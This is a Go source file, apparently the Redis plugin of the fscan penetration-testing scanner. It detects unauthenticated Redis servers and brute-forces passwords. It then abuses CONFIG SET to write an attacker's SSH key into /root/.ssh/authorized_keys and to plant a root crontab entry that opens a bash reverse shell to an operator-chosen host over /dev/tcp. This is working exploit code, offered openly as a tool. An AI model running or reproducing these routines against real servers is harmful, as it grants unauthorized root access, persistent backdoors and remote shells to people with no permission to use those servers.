package Plugins

import (
	"encoding/binary"
	"fmt"
	"github.com/shadow1ng/fscan/common"
	"io"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
	"unicode/utf16"
)

var (
	dbfilename string
	dir        string
)

func RedisScan(info *common.HostInfo) (tmperr error) {
	// -noredis 只跳过写入类测试(Expoilt/testwrite)，未授权检测与弱口令爆破照常执行(跳过逻辑在 Expoilt 中)
	start := time.Now()
	flag, err := RedisUnauth(info)
	if flag == true {
		// L2: flag==true 即成功 —— [vul] 未授权结果已由 RedisUnauth 内部打印。
		// 原判 `flag && err == nil` 会把"未授权已确认但 getconfig/Expoilt 出错"
		// 当成失败, 继续落入下方爆破流程空跑字典。err 降级为 [*] 警告,
		// 不打断成功流程; recoverdb 防护逻辑(Expoilt 内)不受影响。
		if err != nil {
			common.LogSuccess(fmt.Sprintf("[*] redis %v:%v unauthorized ok, post-check warning: %v", info.Host, info.Ports, err))
		}
		return nil
	}
	if common.IsBrute {
		return
	}
	// -br 生效: 按原循环顺序组装口令组合(保留 {user}→"redis" 替换语义), 再投喂 worker。
	// -br 1 时仅一个 worker 顺序消费, 顺序/日志/成功即停/预算与原串行完全一致。
	type combo struct{ user, pass string }
	var combos []combo
	for _, pass := range common.Passwords {
		pass = strings.Replace(pass, "{user}", "redis", -1)
		combos = append(combos, combo{"redis", pass})
	}
	if len(combos) == 0 {
		return tmperr
	}
	workers := common.BruteThread
	if workers < 1 {
		workers = 1
	}
	var (
		mu     sync.Mutex
		found  bool
		closed bool // close(stop) 只执行一次的保护(成功与致命错误两条路径共用)
		stop   = make(chan struct{})
	)
	// 原预算: (int64(len(common.Passwords)) * common.Timeout) 秒, 并发后按 worker 数摊薄
	budget := time.Duration(len(combos)) * time.Duration(common.Timeout) * time.Second / time.Duration(workers)
	// 预填充有缓冲 channel(容量=组合数): 投递不阻塞, worker 提前退出也不会死锁
	jobs := make(chan combo, len(combos))
	for _, c := range combos {
		jobs <- c
	}
	close(jobs)
	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for c := range jobs {
				select {
				case <-stop:
					return // 已有结果, 立即退出
				default:
				}
				if time.Since(start) > budget {
					return // 预算兜底
				}
				flag, err := RedisConn(info, c.pass)
				mu.Lock()
				if flag {
					// L2: flag==true 即成功 —— [vul] 已由 RedisConn 内部按原模板打印
					// (含 file 变体), 这里只负责停止。原判 `flag && err == nil` 会把
					// "认证成功但 getconfig/Expoilt(含 recoverdb) 出错"落入失败分支,
					// 打 [-] 后继续空跑字典。err 降级为 [*] 警告, 不打断成功流程。
					if !found {
						found = true
						if err != nil {
							common.LogSuccess(fmt.Sprintf("[*] redis %v:%v auth ok, post-check warning: %v", info.Host, info.Ports, err))
						}
						if !closed {
							closed = true
							close(stop)
						}
					}
					mu.Unlock()
					return
				}
				if closed {
					mu.Unlock() // 终态(成功/致命)已发生, 丢弃在途失败
					return
				}
				errlog := fmt.Sprintf("[-] redis %v:%v %v %v", info.Host, info.Ports, c.pass, err)
				common.LogError(errlog)
				tmperr = err // 具名返回值, 必须在 mu 内写
				if common.CheckErrs(err) {
					if !closed {
						closed = true
						close(stop)
					}
					mu.Unlock()
					return
				}
				mu.Unlock()
			}
		}()
	}
	wg.Wait()
	if found {
		return nil // 原成功路径 return err(err==nil), 不携带此前失败累计
	}
	return tmperr
}

func RedisConn(info *common.HostInfo, pass string) (flag bool, err error) {
	flag = false
	realhost := fmt.Sprintf("%s:%v", info.Host, info.Ports)
	conn, err := common.WrapperTcpWithTimeout("tcp", realhost, time.Duration(common.BruteTimeout2)*time.Second)
	if err != nil {
		return flag, err
	}
	defer conn.Close()
	err = conn.SetReadDeadline(time.Now().Add(time.Duration(common.BruteTimeout2) * time.Second))
	if err != nil {
		return flag, err
	}
	_, err = conn.Write([]byte(fmt.Sprintf("auth %s\r\n", pass)))
	if err != nil {
		return flag, err
	}
	reply, err := readreply(conn)
	if err != nil {
		return flag, err
	}
	// `-` 简单错误回复（WRONGPASS/NOAUTH 等）在 RESP 层 err==nil，
	// 原样透传会让爆破日志打出 "[-] ... <nil>"；这里转成真实错误信息返回，
	// flag 仍为 false，不影响成功即停与 CheckErrs 致命错误判定语义。
	if strings.HasPrefix(reply, "-") {
		return flag, fmt.Errorf("%s", strings.TrimSpace(reply))
	}
	if strings.Contains(reply, "+OK") {
		flag = true
		dbfilename, dir, err = getconfig(conn)
		if err != nil {
			result := fmt.Sprintf("[vul] Redis %s %s", realhost, pass)
			common.LogSuccess(result)
			return flag, err
		} else {
			result := fmt.Sprintf("[vul] Redis %s %s file:%s/%s", realhost, pass, dir, dbfilename)
			common.LogSuccess(result)
		}
		err = Expoilt(realhost, conn)
	}
	return flag, err
}

func RedisUnauth(info *common.HostInfo) (flag bool, err error) {
	flag = false
	realhost := fmt.Sprintf("%s:%v", info.Host, info.Ports)
	conn, err := common.WrapperTcpWithTimeout("tcp", realhost, time.Duration(common.Timeout)*time.Second)
	if err != nil {
		return flag, err
	}
	defer conn.Close()
	err = conn.SetReadDeadline(time.Now().Add(time.Duration(common.Timeout) * time.Second))
	if err != nil {
		return flag, err
	}
	_, err = conn.Write([]byte("info\r\n"))
	if err != nil {
		return flag, err
	}
	reply, err := readreply(conn)
	if err != nil {
		return flag, err
	}
	if strings.Contains(reply, "redis_version") {
		flag = true
		dbfilename, dir, err = getconfig(conn)
		if err != nil {
			result := fmt.Sprintf("[vul] Redis %s unauthorized", realhost)
			common.LogSuccess(result)
			return flag, err
		} else {
			result := fmt.Sprintf("[vul] Redis %s unauthorized file:%s/%s", realhost, dir, dbfilename)
			common.LogSuccess(result)
		}
		err = Expoilt(realhost, conn)
	}
	return flag, err
}

func Expoilt(realhost string, conn net.Conn) error {
	// -noredis: 跳过 Redis 写入类测试(Expoilt/testwrite)
	if common.Noredistest {
		return nil
	}
	// 在任何修改目标 CONFIG 的动作(testwrite/writekey/writecron)之前注册恢复，
	// 保证任意错误提前 return(含 panic)的路径都会恢复目标 dir/dbfilename，防止残留配置覆盖真实文件
	recovered := false
	defer func() {
		if !recovered {
			recoverdb(dbfilename, dir, conn)
		}
	}()
	flagSsh, flagCron, err := testwrite(conn)
	if err != nil {
		return err
	}
	if flagSsh == true {
		result := fmt.Sprintf("[vul] Redis %v like can write /root/.ssh/", realhost)
		common.LogSuccess(result)
		if common.RedisFile != "" {
			writeok, text, err := writekey(conn, common.RedisFile)
			if err != nil {
				fmt.Println(fmt.Sprintf("[-] %v SSH write key errer: %v", realhost, text))
				return err
			}
			if writeok {
				result := fmt.Sprintf("[vul] Redis %v SSH public key was written successfully", realhost)
				common.LogSuccess(result)
			} else {
				fmt.Println("[-] Redis ", realhost, "SSHPUB write failed", text)
			}
		}
	}

	if flagCron == true {
		result := fmt.Sprintf("[vul] Redis %v like can write /var/spool/cron/", realhost)
		common.LogSuccess(result)
		if common.RedisShell != "" {
			writeok, text, err := writecron(conn, common.RedisShell)
			if err != nil {
				return err
			}
			if writeok {
				result := fmt.Sprintf("[vul] Redis %v /var/spool/cron/root was written successfully", realhost)
				common.LogSuccess(result)
			} else {
				fmt.Println("[-] Redis ", realhost, "cron write failed", text)
			}
		}
	}
	// 正常完成路径仍显式恢复，保留原有 recoverdb 错误返回语义；defer 只兜底提前 return 的路径
	recovered = true
	err = recoverdb(dbfilename, dir, conn)
	return err
}

func writekey(conn net.Conn, filename string) (flag bool, text string, err error) {
	flag = false
	// 先读取并校验 -rf 公钥文件，再修改目标 CONFIG，避免“先改配置后发现文件读不到”导致配置残留
	key, err := Readfile(filename)
	if err != nil {
		text = fmt.Sprintf("Open %s error, %v", filename, err)
		return flag, text, err
	}
	if len(key) == 0 {
		text = fmt.Sprintf("the keyfile %s is empty", filename)
		return flag, text, err
	}
	_, err = conn.Write([]byte("CONFIG SET dir /root/.ssh/\r\n"))
	if err != nil {
		return flag, text, err
	}
	text, err = readreply(conn)
	if err != nil {
		return flag, text, err
	}
	if strings.Contains(text, "OK") {
		_, err := conn.Write([]byte("CONFIG SET dbfilename authorized_keys\r\n"))
		if err != nil {
			return flag, text, err
		}
		text, err = readreply(conn)
		if err != nil {
			return flag, text, err
		}
		if strings.Contains(text, "OK") {
			_, err = conn.Write([]byte(fmt.Sprintf("set x \"\\n\\n\\n%v\\n\\n\\n\"\r\n", key)))
			if err != nil {
				return flag, text, err
			}
			text, err = readreply(conn)
			if err != nil {
				return flag, text, err
			}
			if strings.Contains(text, "OK") {
				_, err = conn.Write([]byte("save\r\n"))
				if err != nil {
					return flag, text, err
				}
				text, err = readreply(conn)
				if err != nil {
					return flag, text, err
				}
				if strings.Contains(text, "OK") {
					flag = true
				}
			}
		}
	}
	text = strings.TrimSpace(text)
	if len(text) > 50 {
		text = text[:50]
	}
	return flag, text, err
}

// parseCronTarget 严格解析 -rs 的回连地址(S7)：
// 用 net.SplitHostPort 解析(兼容 [::1]:6666 等 IPv6 写法，原实现按 ':' 盲拆
// 会得到 scanIp="[" / 端口为空)；host 必须非空且只允许字母/数字/./-/_/:，
// 拒绝 shell/cron 元字符( ; | & $ ` \ ( ) { } < > * ? [ ] ' " # % 及空白/控制符)；
// port 必须是 1-65535 的纯数字(拒绝 +80/-80 等 Atoi 能接受的非纯数字形式)。
// 任一不满足即返回 error，调用方不得发送任何写入命令，避免异常值/注入载荷
// 覆盖目标原 crontab。
func parseCronTarget(target string) (string, string, error) {
	scanIp, scanPort, err := net.SplitHostPort(target)
	if err != nil {
		return "", "", fmt.Errorf("invalid -rs address %q: %v", target, err)
	}
	if scanIp == "" {
		return "", "", fmt.Errorf("invalid -rs address %q: empty host", target)
	}
	for _, c := range scanIp {
		switch {
		case c >= 'a' && c <= 'z', c >= 'A' && c <= 'Z', c >= '0' && c <= '9',
			c == '.', c == '-', c == '_', c == ':':
		default:
			return "", "", fmt.Errorf("invalid -rs host %q: unsafe character %q", scanIp, string(c))
		}
	}
	if scanPort == "" {
		return "", "", fmt.Errorf("invalid -rs address %q: empty port", target)
	}
	for _, c := range scanPort {
		if c < '0' || c > '9' {
			return "", "", fmt.Errorf("invalid -rs port %q: must be pure digits", scanPort)
		}
	}
	port, err := strconv.Atoi(scanPort)
	if err != nil || port < 1 || port > 65535 {
		return "", "", fmt.Errorf("invalid -rs port %q: out of range 1-65535", scanPort)
	}
	return scanIp, scanPort, nil
}

func writecron(conn net.Conn, host string) (flag bool, text string, err error) {
	flag = false
	// 先严格校验 -rs 回连地址：任何非法值立即返回 error，
	// 不向目标发送 CONFIG SET/写入命令(避免损坏目标 crontab)(S7)
	scanIp, scanPort, err := parseCronTarget(host)
	if err != nil {
		return flag, fmt.Sprintf("invalid -rs target: %v", err), err
	}
	// 尝试写入Ubuntu的路径
	_, err = conn.Write([]byte("CONFIG SET dir /var/spool/cron/crontabs/\r\n"))
	if err != nil {
		return flag, text, err
	}
	text, err = readreply(conn)
	if err != nil {
		return flag, text, err
	}
	if !strings.Contains(text, "OK") {
		// 如果没有返回"OK"，可能是CentOS，尝试CentOS的路径
		_, err = conn.Write([]byte("CONFIG SET dir /var/spool/cron/\r\n"))
		if err != nil {
			return flag, text, err
		}
		text, err = readreply(conn)
		if err != nil {
			return flag, text, err
		}
	}
	if strings.Contains(text, "OK") {
		_, err = conn.Write([]byte("CONFIG SET dbfilename root\r\n"))
		if err != nil {
			return flag, text, err
		}
		text, err = readreply(conn)
		if err != nil {
			return flag, text, err
		}
		if strings.Contains(text, "OK") {
			// scanIp/scanPort 已在函数入口经 parseCronTarget 严格校验(S7)
			_, err = conn.Write([]byte(fmt.Sprintf("set xx \"\\n* * * * * bash -i >& /dev/tcp/%v/%v 0>&1\\n\"\r\n", scanIp, scanPort)))
			if err != nil {
				return flag, text, err
			}
			text, err = readreply(conn)
			if err != nil {
				return flag, text, err
			}
			if strings.Contains(text, "OK") {
				_, err = conn.Write([]byte("save\r\n"))
				if err != nil {
					return flag, text, err
				}
				text, err = readreply(conn)
				if err != nil {
					return flag, text, err
				}
				if strings.Contains(text, "OK") {
					flag = true
				}
			}
		}
	}
	text = strings.TrimSpace(text)
	if len(text) > 50 {
		text = text[:50]
	}
	return flag, text, err
}

// Readfile 读取 -rf 指定的公钥文件, 返回首个非空行(保持原 bufio.Scanner 语义)。
// L3: 原实现 TrimSpace 不剥 BOM(U+FEFF 不是空白字符), 带 BOM 的公钥会把 BOM
// 一并写进目标 authorized_keys; 改为整文件读入后经 decodeBOMText 统一规整
// (剥 UTF-8 BOM / UTF-16 LE/BE 转码)再按行取值。
func Readfile(filename string) (string, error) {
	data, err := os.ReadFile(filename)
	if err != nil {
		return "", err
	}
	text, err := decodeBOMText(data)
	if err != nil {
		return "", err
	}
	for _, line := range strings.Split(text, "\n") {
		line = strings.TrimSpace(line)
		if line != "" {
			return line, nil
		}
	}
	return "", nil
}

// decodeBOMText 将文件原始字节规整为 UTF-8 文本: UTF-16 LE(BOM FF FE)/
// UTF-16 BE(BOM FE FF) 整段转码为 UTF-8, UTF-8 BOM(EF BB BF) 剥离,
// 其余按原样当作 UTF-8 文本。与 common 包 decodeTextBytes 同口径——
// 该函数未导出且 common 不在本次授权改动文件内, 无法直接复用,
// 故在本包按同逻辑实现; 供 -rf 公钥(redis.go)与 -sshkey 私钥(ssh.go)共用。
// 无 BOM 的 UTF-16 不做启发式猜测, 与 common 版本一致。
func decodeBOMText(data []byte) (string, error) {
	if len(data) >= 2 && data[0] == 0xFF && data[1] == 0xFE {
		return decodeUTF16Text(data[2:], binary.LittleEndian)
	}
	if len(data) >= 2 && data[0] == 0xFE && data[1] == 0xFF {
		return decodeUTF16Text(data[2:], binary.BigEndian)
	}
	if len(data) >= 3 && data[0] == 0xEF && data[1] == 0xBB && data[2] == 0xBF {
		data = data[3:]
	}
	return string(data), nil
}

// decodeUTF16Text 将 UTF-16 字节流(已去 BOM)按 order 解码为 UTF-8 字符串。
// 奇数字节长、未配对代理项视为转码失败并返回错误(与 common.decodeUTF16 一致)。
func decodeUTF16Text(data []byte, order binary.ByteOrder) (string, error) {
	if len(data)%2 != 0 {
		return "", fmt.Errorf("UTF-16 decode failed: odd length %d byte(s)", len(data))
	}
	units := make([]uint16, len(data)/2)
	for i := range units {
		units[i] = order.Uint16(data[i*2:])
	}
	runes := make([]rune, 0, len(units))
	for i := 0; i < len(units); i++ {
		u := units[i]
		switch {
		case u >= 0xD800 && u <= 0xDBFF:
			if i+1 >= len(units) || units[i+1] < 0xDC00 || units[i+1] > 0xDFFF {
				return "", fmt.Errorf("UTF-16 decode failed: unpaired surrogate 0x%04X at unit %d", u, i)
			}
			runes = append(runes, utf16.DecodeRune(rune(u), rune(units[i+1])))
			i++
		case u >= 0xDC00 && u <= 0xDFFF:
			return "", fmt.Errorf("UTF-16 decode failed: isolated low surrogate 0x%04X at unit %d", u, i)
		default:
			runes = append(runes, rune(u))
		}
	}
	return string(runes), nil
}

// readRESPLine 从连接逐字节读取一行直到 \r\n（含），返回整行（不含类型字节）。
// 逐字节读是为了精确按 RESP 帧边界截断，不额外缓冲下一帧的数据。
func readRESPLine(conn net.Conn) ([]byte, error) {
	var line []byte
	var b [1]byte
	for {
		if _, err := io.ReadFull(conn, b[:]); err != nil {
			return line, err
		}
		line = append(line, b[0])
		if len(line) >= 2 && line[len(line)-2] == '\r' && line[len(line)-1] == '\n' {
			return line, nil
		}
		if len(line) > 65536 {
			return line, fmt.Errorf("redis reply line too long: %d", len(line))
		}
	}
}

// parseRESPCount 解析长度/计数行的数值部分。
// 契约：只接收 head 类型字节已被 readRESPValue 消费后、由 readRESPLine 返回的行，
// 行内不含 `$`/`*` 前缀（如 "12\r\n"、"2\r\n"、"-1\r\n"）。
// 原实现按“带前缀”假设剥首字符：单字符计数（"2"）被剥成空串导致
// strconv.Atoi: parsing "": invalid syntax；多位长度（"10"）丢首位数字导致
// 流错位（少读数据体，下一帧类型字节落在数据体上，报 unknown reply type）。
// 现按无前缀契约原样解析；空行或非数字返回干净错误，绝不错位继续。
func parseRESPCount(line []byte) (int, error) {
	s := strings.TrimSuffix(string(line), "\r\n")
	if s == "" {
		return 0, fmt.Errorf("redis RESP count line is empty")
	}
	n, err := strconv.Atoi(s)
	if err != nil {
		return 0, fmt.Errorf("invalid redis RESP count %q: %w", s, err)
	}
	return n, nil
}

// readRESPValue 按 RESP 协议读取一个完整回复帧：
// 简单串/错误/整数读到 \r\n 为止；bulk 串先读长度行再按长度读满体；
// 数组按元素个数递归读取。所有路径“读够即返回”，不等超时来截断，
// 且任何部分读取都保留并返回 err（不再清空），避免半包被当成完整回复。
func readRESPValue(conn net.Conn, depth int) ([]byte, error) {
	if depth > 16 {
		return nil, fmt.Errorf("redis reply nested too deep")
	}
	var out []byte
	head := make([]byte, 1)
	if _, err := io.ReadFull(conn, head); err != nil {
		return out, err
	}
	out = append(out, head[0])
	switch head[0] {
	case '+', '-', ':':
		line, err := readRESPLine(conn)
		out = append(out, line...)
		return out, err
	case '$':
		line, err := readRESPLine(conn)
		out = append(out, line...)
		if err != nil {
			return out, err
		}
		n, err := parseRESPCount(line)
		if err != nil {
			return out, err
		}
		if n < 0 {
			return out, nil // null bulk string，无体
		}
		if n > 64*1024*1024 {
			return out, fmt.Errorf("redis bulk reply too large: %d", n)
		}
		body := make([]byte, n+2) // 数据体 + 结尾 \r\n
		readN, err := io.ReadFull(conn, body)
		out = append(out, body[:readN]...)
		if err != nil {
			return out, err // 部分读取：err 不清空
		}
		return out, nil
	case '*':
		line, err := readRESPLine(conn)
		out = append(out, line...)
		if err != nil {
			return out, err
		}
		count, err := parseRESPCount(line)
		if err != nil {
			return out, err
		}
		if count < 0 {
			return out, nil // null array
		}
		if count > 1024*1024 {
			return out, fmt.Errorf("redis array reply too large: %d", count)
		}
		for i := 0; i < count; i++ {
			v, vErr := readRESPValue(conn, depth+1)
			out = append(out, v...)
			if vErr != nil {
				return out, vErr
			}
		}
		return out, nil
	default:
		line, err := readRESPLine(conn)
		out = append(out, line...)
		if err != nil {
			return out, err
		}
		return out, fmt.Errorf("unknown redis reply type %q", head[0])
	}
}

func readreply(conn net.Conn) (string, error) {
	// 读超时取可配置的 common.BruteTimeout2（原为固定 1s，忽略配置项）
	_ = conn.SetReadDeadline(time.Now().Add(time.Duration(common.BruteTimeout2) * time.Second))
	// 按 RESP 协议帧读满即返回，不再用 io.ReadAll 等到超时才结束；
	// 部分读取不清空 err，防止超时收到的半包被当成完整 RESP
	//（正确口令的 +OK 迟到被判失败漏报、getconfig 解析出错值导致 recoverdb 恢复错误配置）
	data, err := readRESPValue(conn, 0)
	return string(data), err
}

func testwrite(conn net.Conn) (flag bool, flagCron bool, err error) {
	var text string
	_, err = conn.Write([]byte("CONFIG SET dir /root/.ssh/\r\n"))
	if err != nil {
		return flag, flagCron, err
	}
	text, err = readreply(conn)
	if err != nil {
		return flag, flagCron, err
	}
	if strings.Contains(text, "OK") {
		flag = true
	}
	_, err = conn.Write([]byte("CONFIG SET dir /var/spool/cron/\r\n"))
	if err != nil {
		return flag, flagCron, err
	}
	text, err = readreply(conn)
	if err != nil {
		return flag, flagCron, err
	}
	if strings.Contains(text, "OK") {
		flagCron = true
	}
	return flag, flagCron, err
}

func getconfig(conn net.Conn) (dbfilename string, dir string, err error) {
	_, err = conn.Write([]byte("CONFIG GET dbfilename\r\n"))
	if err != nil {
		return
	}
	text, err := readreply(conn)
	if err != nil {
		return
	}
	// `-` 错误回复（CONFIG 被禁用/重命名）与 `*0` 空数组不能当配置值：
	// 否则 dbfilename 会变成 "-ERR ..." 之类垃圾，[vul] 带错 file 变体，
	// 且 recoverdb 会把垃圾写回目标 CONFIG（配置污染）。
	if strings.HasPrefix(text, "-") || strings.HasPrefix(text, "*0") {
		return "", "", fmt.Errorf("redis CONFIG GET dbfilename reply: %s", strings.TrimSpace(text))
	}
	text1 := strings.Split(text, "\r\n")
	if len(text1) > 2 {
		dbfilename = text1[len(text1)-2]
	} else {
		dbfilename = text1[0]
	}
	_, err = conn.Write([]byte("CONFIG GET dir\r\n"))
	if err != nil {
		return
	}
	text, err = readreply(conn)
	if err != nil {
		return
	}
	if strings.HasPrefix(text, "-") || strings.HasPrefix(text, "*0") {
		return dbfilename, "", fmt.Errorf("redis CONFIG GET dir reply: %s", strings.TrimSpace(text))
	}
	text1 = strings.Split(text, "\r\n")
	if len(text1) > 2 {
		dir = text1[len(text1)-2]
	} else {
		dir = text1[0]
	}
	return
}

func recoverdb(dbfilename string, dir string, conn net.Conn) (err error) {
	_, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dbfilename %s\r\n", dbfilename)))
	if err != nil {
		return
	}
	_, err = readreply(conn)
	if err != nil {
		return
	}
	_, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dir %s\r\n", dir)))
	if err != nil {
		return
	}
	_, err = readreply(conn)
	if err != nil {
		return
	}
	return
}
